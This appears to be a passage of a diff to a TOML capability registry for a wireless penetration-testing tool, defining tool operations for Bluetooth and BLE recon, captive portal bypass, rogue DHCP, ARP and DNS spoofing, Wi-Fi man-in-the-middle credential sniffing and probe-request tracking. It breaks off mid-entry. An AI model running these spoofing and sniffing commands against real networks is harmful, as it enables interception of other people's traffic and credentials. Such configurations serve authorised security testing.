+args = ['wpa3_report.py', '--in', '/tmp/wpa3/', '--out', '/tmp/wpa3_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Probe Result Review'
+args = ['/tmp/wpa3/results.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.bt-recon'
+phase = 'wireless'
+label = 'BLUETOOTH RECON'
+summary = 'Classic Bluetooth device discovery and service enumeration'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'hci0' } ]
+[[capability.provider]]
+binary = 'hciconfig'
+[[capability.provider.operation]]
+name = 'Adapter Status Pull'
+args = ['{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Adapter Up Enable'
+args = ['{iface}', 'up']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Adapter Scan Enable'
+args = ['{iface}', 'pscan', 'sscan']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcitool'
+[[capability.provider.operation]]
+name = 'Inquiry Device Scan'
+args = ['scan', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Name Lookup Sweep'
+args = ['name', '{btaddr}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Remote Info Pull'
+args = ['info', '{btaddr}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'bluetoothctl'
+[[capability.provider.operation]]
+name = 'Devices List Pull'
+args = ['devices']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Info Target Pull'
+args = ['info', '{btaddr}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sdptool'
+[[capability.provider.operation]]
+name = 'Service Browse Target'
+args = ['browse', '{btaddr}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Obex Ftp Search'
+args = ['search', '--bdaddr', '{btaddr}', 'OBEX']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'btmon'
+[[capability.provider.operation]]
+name = 'Hci Traffic Monitor'
+args = ['-w', '/tmp/bt/btmon.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Bt Frames Extract'
+args = ['-r', '/tmp/bt/bt_capture.pcap', '-Y', 'bluetooth.hci_h4', '-T', 'fields', '-e', 'bluetooth.src', '-e', 'bluetooth.dst']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Spp Service Marker'
+args = ['-iE', 'Serial Port|OBEX|Headset', '/tmp/bt/sdp.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Bt Device Dedup'
+args = ['-u', '/tmp/bt/devices.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Bt Device Count'
+args = ['-l', '/tmp/bt/devices.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Bt Capture Verify'
+args = ['/tmp/bt/bt_capture.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Bt Evidence Hash'
+args = ['/tmp/bt/btmon.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Bt Report Build'
+args = ['bt_report.py', '--in', '/tmp/bt/devices.txt', '--out', '/tmp/bt_report.json']
+output = 'json'
+network = false
+
+[[capability]]
+id = 'wireless.iot-ble-sweep'
+phase = 'wireless'
+label = 'IOT BLE SWEEP'
+summary = 'BLE device scanning and GATT characteristic enumeration'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'hci0' } ]
+[[capability.provider]]
+binary = 'hcitool'
+[[capability.provider.operation]]
+name = 'Lescan Sweep'
+args = ['lescan', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Lename Lookup'
+args = ['lename', '{bleaddr}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'bluetoothctl'
+[[capability.provider.operation]]
+name = 'Ble Scan On'
+args = ['scan', 'on']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Ble Connect Target'
+args = ['connect', '{bleaddr}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'gatttool'
+[[capability.provider.operation]]
+name = 'Gatt Primary Services'
+args = ['-b', '{bleaddr}', '--primary']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Gatt Chars Enumerate'
+args = ['-b', '{bleaddr}', '--characteristics']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Gatt Char Read'
+args = ['-b', '{bleaddr}', '--char-read-uuid=00002a00-0000-1000-8000-00805f9b34fb']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'btmon'
+[[capability.provider.operation]]
+name = 'Ble Traffic Monitor'
+args = ['-w', '/tmp/ble/btmon.log']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Adv Data Extract'
+args = ['-r', '/tmp/ble/ble.pcap', '-Y', 'btcommon.eir_ad.entry.device_name', '-T', 'fields', '-e', 'btcommon.eir_ad.entry.device_name']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Ibeacon Marker Hunt'
+args = ['-oE', '4c00[0-9a-f]+', '/tmp/ble/btmon.log']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Uart Service Marker'
+args = ['-iE', '6e400001|nordic|uart', '/tmp/ble/gatt.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Ble Adv Parse'
+args = ['ble_parse.py', '--in', '/tmp/ble/btmon.log', '--out', '/tmp/ble/devices.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Ble Device Dedup'
+args = ['-u', '/tmp/ble/devices.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Ble Device Count'
+args = ['-l', '/tmp/ble/devices.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Ble Capture Verify'
+args = ['/tmp/ble/ble.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Ble Evidence Hash'
+args = ['/tmp/ble/devices.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Ble Report Build'
+args = ['ble_report.py', '--in', '/tmp/ble/devices.json', '--out', '/tmp/ble_report.json']
+output = 'json'
+network = false
+
+[[capability]]
+id = 'wireless.captive-portal'
+phase = 'wireless'
+label = 'CAPTIVE PORTAL'
+summary = 'Captive portal bypass and credential capture testing'
+inputs = [ { key = 'url', type = 'url', required = true }, { key = 'iface', type = 'text', required = false, default = 'wlan0' } ]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Portal Redirect Probe'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code} %{redirect_url}', 'http://{url}/']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Portal Http Probe'
+args = ['-sk', 'http://{url}/status']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Dns Tunnel Probe'
+args = ['-sk', 'http://{url}/?dns=ts123.{domain}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'Preauth Dns Bypass Test'
+args = ['@{portal_dns}', 'tstest.{domain}', '+short']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Mac Rotation Bypass'
+args = ['mac_rotate.py', '--iface', '{iface}', '--count', '3']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'macchanger'
+[[capability.provider.operation]]
+name = 'Manual Mac Spoof'
+args = ['-r', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Post Cred Test Submit'
+args = ['-sk', 'http://{url}/login', '-d', 'user=tsuser&pass=tsprobe']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Header Bypass Probe'
+args = ['-sk', '-H', 'X-Forwarded-For: 10.0.0.1', 'http://{url}/internet']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Dns Tunnel Client Probe'
+args = ['dns_tunnel.py', '--server', '{portal_dns}', '--domain', '{domain}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Portal Traffic Capture'
+args = ['-i', '{iface}', '-nn', '-w', '/tmp/portal/portal.pcap', '-c', '1000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Redirect 302 Extract'
+args = ['-r', '/tmp/portal/portal.pcap', '-Y', 'http.response.code==302', '-T', 'fields', '-e', 'http.location']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Portal Token Sweep'
+args = ['-rnoiE', '(token|session|auth)[=:][a-z0-9]+', '/tmp/portal/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Portal Cap Verify'
+args = ['/tmp/portal/portal.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Portal Evidence Hash'
+args = ['/tmp/portal/portal.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Bypass Attempt Count'
+args = ['-l', '/tmp/portal/attempts.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Portal Report Build'
+args = ['portal_report.py', '--in', '/tmp/portal/', '--out', '/tmp/portal_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Bypass Method Dedup'
+args = ['-u', '/tmp/portal/methods.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.rogue-dhcp'
+phase = 'wireless'
+label = 'ROGUE DHCP'
+summary = 'Rogue DHCP and ARP spoofing on wireless segments'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' }, { key = 'gw', type = 'target', required = true } ]
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Dhcp Discover Send'
+args = ['dhcp_discover.py', '--iface', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Dhcp Offer Sniff'
+args = ['-i', '{iface}', '-nn', '-c', '20', 'udp port 67 or udp port 68']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Dhcp Server Extract'
+args = ['-i', '{iface}', '-Y', 'dhcp.type==2', '-T', 'fields', '-e', 'ip.src', '-e', 'dhcp.option.router', '-c', '10']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Rogue Dhcp Offer Send'
+args = ['rogue_dhcp.py', '--iface', '{iface}', '--range', '10.0.9.100,10.0.9.200', '--gw', '10.0.9.1']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'arp-scan'
+[[capability.provider.operation]]
+name = 'Segment Host Discover'
+args = ['--interface', '{iface}', '--localnet']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Arp Spoof Gw Pivot'
+args = ['arp_spoof.py', '--iface', '{iface}', '--gw', '{gw}', '--victims', '/tmp/rd/victims.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Arp Poison Confirm'
+args = ['-i', '{iface}', '-nn', '-c', '30', 'arp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'dnsmasq'
+[[capability.provider.operation]]
+name = 'Rogue Dhcp Serve Start'
+args = ['-C', '/tmp/rd/dnsmasq.conf', '-d', '--no-daemon']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iptables'
+[[capability.provider.operation]]
+name = 'Forward Divert Rule'
+args = ['-A', 'FORWARD', '-i', '{iface}', '-j', 'ACCEPT']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Multiple Dhcp Server Hunt'
+args = ['-iE', 'offer|ack', '/tmp/rd/dhcp_capture.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Dhcp Server Dedup'
+args = ['-u', '/tmp/rd/servers.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Dhcp Offer Count'
+args = ['-l', '/tmp/rd/servers.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Rd Capture Verify'
+args = ['/tmp/rd/dhcp_capture.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Rd Evidence Hash'
+args = ['/tmp/rd/dhcp_capture.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Cred Sniff From Pivot'
+args = ['cred_sniff.py', '--iface', '{iface}', '--out', '/tmp/rd/creds.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Rd Report Build'
+args = ['rd_report.py', '--in', '/tmp/rd/', '--out', '/tmp/rd_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Victim List Review'
+args = ['/tmp/rd/victims.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.wifi-mitm'
+phase = 'wireless'
+label = 'WIFI MITM'
+summary = 'Wireless man in the middle with traffic and credential capture'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' }, { key = 'gw', type = 'target', required = true } ]
+[[capability.provider]]
+binary = 'bettercap'
+[[capability.provider.operation]]
+name = 'Full Mitm Session Start'
+args = ['-iface', '{iface}', '-eval', 'set arp.spoof.internal true; arp.spoof on; net.sniff on']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Http Sniff Only Run'
+args = ['-iface', '{iface}', '-eval', 'set net.sniff.http true; net.sniff on; http.proxy on']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Dns Spoof Enable'
+args = ['-iface', '{iface}', '-eval', 'set dns.spoof.domains {domain}; dns.spoof on']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Mitm Traffic Capture'
+args = ['-i', '{iface}', '-nn', '-w', '/tmp/mitm/mitm.pcap', '-c', '5000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Http Cred Extract'
+args = ['-r', '/tmp/mitm/mitm.pcap', '-Y', 'http.request.method==POST', '-T', 'fields', '-e', 'http.file_data']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Dns Query Extract'
+args = ['-r', '/tmp/mitm/mitm.pcap', '-Y', 'dns', '-T', 'fields', '-e', 'dns.qry.name', '-c', '200']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Basic Auth Hunt'
+args = ['-a', '-oE', 'Authorization: Basic [A-Za-z0-9+/=]+', '/tmp/mitm/http.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Pcap Cred Parse'
+args = ['pcap_creds.py', '--in', '/tmp/mitm/mitm.pcap', '--out', '/tmp/mitm/creds.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Dns Query Dedup'
+args = ['-u', '/tmp/mitm/dns_queries.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Cred Hit Count'
+args = ['-l', '/tmp/mitm/creds.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Mitm Cap Verify'
+args = ['/tmp/mitm/mitm.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Mitm Evidence Hash'
+args = ['/tmp/mitm/creds.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'arp-scan'
+[[capability.provider.operation]]
+name = 'Spoofed Host Enumerate'
+args = ['--interface', '{iface}', '--localnet']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iptables'
+[[capability.provider.operation]]
+name = 'Traffic Divert Confirm'
+args = ['-L', 'FORWARD', '-n', '-v']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Mitm Report Build'
+args = ['mitm_report.py', '--in', '/tmp/mitm/creds.json', '--out', '/tmp/mitm_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Sniffed Cred Review'
+args = ['/tmp/mitm/creds.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.packet-analysis'
+phase = 'wireless'
+label = 'PACKET ANALYSIS'
+summary = 'Deep 802.11 frame analysis for security assessment'
+inputs = [ { key = 'pcap', type = 'file', required = false, default = '/tmp/cap/full_band-01.cap' } ]
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Beacon Frame Stats'
+args = ['-r', '{pcap}', '-Y', 'wlan.fc.type_subtype==8', '-z', 'io,stat,0', '-q']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Probe Request Extract'
+args = ['-r', '{pcap}', '-Y', 'wlan.fc.type_subtype==4', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Mgmt Frame Raw Dump'
+args = ['-r', '{pcap}', '-nn', '-e', '-c', '500', 'type mgt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Pcap Structure Verify'
+args = ['--check', '{pcap}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Retransmission Hunt'
+args = ['-c', 'retrans', '/tmp/analysis/tshark_io.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Frame Type Histogram'
+args = ['frame_hist.py', '--in', '{pcap}', '--out', '/tmp/analysis/hist.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Cipher Suite Extract'
+args = ['-r', '{pcap}', '-T', 'fields', '-e', 'wlan.rsn.pcs', '-Y', 'wlan.fc.type_subtype==8']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Vendor Ie Hunt'
+args = ['-r', '{pcap}', '-T', 'fields', '-e', 'wlan.tag.vendor.oui.type', '-Y', 'wlan.fc.type_subtype==8']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Frame Count Tally'
+args = ['-l', '/tmp/analysis/frames.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Client Mac Dedup'
+args = ['-u', '/tmp/analysis/clients.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Analysis Cap Verify'
+args = ['{pcap}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Analysis Hash Snapshot'
+args = ['{pcap}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Io Stats Review'
+args = ['/tmp/analysis/tshark_io.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Deauth Flood Detection'
+args = ['-r', '{pcap}', '-Y', 'wlan.fc.type_subtype==12', '-z', 'io,stat,1', '-q']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Packet Report Build'
+args = ['packet_report.py', '--in', '/tmp/analysis/', '--out', '/tmp/packet_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Channel Utilization Stats'
+args = ['-r', '{pcap}', '-T', 'fields', '-e', 'radiotap.channel.freq', '-c', '1000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Anomaly Score Compute'
+args = ['anomaly_score.py', '--in', '/tmp/analysis/hist.json']
+output = 'json'
+network = false
+
+[[capability]]
+id = 'wireless.spectrum-survey'
+phase = 'wireless'
+label = 'SPECTRUM SURVEY'
+summary = 'RF spectrum and channel utilization survey'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' } ]
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = '2g Band Survey'
+args = ['{iface}', '--band', 'b', '--write', '/tmp/spec/survey_2g']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = '5g Band Survey'
+args = ['{iface}', '--band', 'a', '--write', '/tmp/spec/survey_5g']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Survey Dump Channel'
+args = ['dev', '{iface}', 'survey', 'dump']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Freq Usage Pull'
+args = ['phy', 'freq', 'info']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Rtl Sdr Iq Capture'
+args = ['rtl_capture.py', '--freq', '2437000000', '--samples', '1000000', '--out', '/tmp/spec/iq.bin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Fft Spectrum Compute'
+args = ['fft_analyze.py', '--in', '/tmp/spec/iq.bin', '--out', '/tmp/spec/fft.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'kalibrate-rtl'
+[[capability.provider.operation]]
+name = 'Freq Offset Calibrate'
+args = ['-s', '2437', '-g', '40']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Busy Channel Extract'
+args = ['-iE', 'busy|noise|time.*busy', '/tmp/spec/survey.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Channel Util Sort'
+args = ['-k', '2', '-r', '/tmp/spec/util.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Ap Per Channel Count'
+args = ['-l', '/tmp/spec/ch_aps.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Iq Artifact Verify'
+args = ['/tmp/spec/iq.bin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Spec Evidence Hash'
+args = ['/tmp/spec/fft.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Overlap Detector'
+args = ['channel_overlap.py', '--in', '/tmp/spec/survey_2g-01.csv']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Survey Csv Review'
+args = ['/tmp/spec/survey_5g-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Spectrum Report Build'
+args = ['spec_report.py', '--in', '/tmp/spec/', '--out', '/tmp/spec_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Tx Power Check'
+args = ['dev', '{iface}', 'get', 'txpower']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.probe-privacy'
+phase = 'wireless'
+label = 'PROBE PRIVACY'
+summary = 'Probe request privacy leakage and client tracking assessment'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' } ]
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Probe Request Capture'
+args = ['-i', '{iface}', '-nn', '-w', '/tmp/probe/probes.pcap', '-c', '3000', 'type mgt subtype probe-req']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Probe Ssid Extract'
+args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.ssid', '-Y', 'wlan.fc.type_subtype==4']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Randomized Mac Flag'
+args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.wlan_sec', '-Y', 'wlan.fc.type_subtype==4']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Oui Vendor Map'
+args = ['oui_map.py', '--in', '/tmp/probe/probes.pcap', '--out', '/tmp/probe/vendors.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Wildcard Probe Hunt'
+args = ['-iE', 'length:0|broadcast', '/tmp/probe/ssids.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Probe Client Dedup'
+args = ['-u', '/tmp/probe/clients.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Probe Client Count'
+args = ['-l', '/tmp/probe/clients.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Probe Cluster Build'
+args = ['probe_cluster.py', '--in', '/tmp/probe/probes.pcap', '--out', '/tmp/probe/clusters.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Probe Station Monitor'
+args = ['{iface}', '--write', '/tmp/probe/stations', '--output-format', 'csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Rsn Cap Privacy Check'
+args = ['-r', '/tmp/probe/probes.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-c', '100']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Probe Cap Verify'
+args = ['/tmp/probe/probes.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Probe Evidence Hash'
+args = ['/tmp/probe/clusters.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Vendor Map Review'
+args = ['/tmp/probe/vendors.json']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Privacy Score Compute'
+args = ['privacy_score.py', '--in', '/tmp/probe/clusters.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Ssid Leak Dedup'
+args = ['-u', '/tmp/probe/leaked_ssids.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Probe Report Build'
+args = ['probe_report.py', '--in', '/tmp/probe/', '--out', '/tmp/probe_report.json']
+output = 'json'
+network = false
 
 [[capability]]
 id = 'wireless.isolation-testing'
 phase = 'wireless'
 label = 'ISOLATION TESTING'
-summary = 'Prove or break client isolation between wireless peers'
-inputs = [
-  { key = 'interface', type = 'interface', required = false, default = 'wlan0' },
-  { key = 'subnet', type = 'list', required = false, default = '10.0.0.0/24' },
-  { key = 'gateway', type = 'target', required = false, default = '10.0.0.1' },
-  { key = 'peer', type = 'target', required = false, default = '10.0.0.42' },
-]
+summary = 'Client isolation and lateral reachability from wireless segment'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' }, { key = 'cidr', type = 'cidr', required = true } ]
 [[capability.provider]]
 binary = 'arping'
 [[capability.provider.operation]]
-name = 'ARP Reachability'
-args = ['-I', '{interface}', '-c', '3', '{peer}']
+name = 'Arp Sweep Clients'
+args = ['-I', '{iface}', '{cidr}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'fping'
 [[capability.provider.operation]]
-name = 'Subnet Sweep'
-args = ['-a', '-g', '{subnet}']
+name = 'Icmp Client Sweep'
+args = ['-g', '{cidr}', '-c', '2']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'nmap'
 [[capability.provider.operation]]
-name = 'Peer Ports'
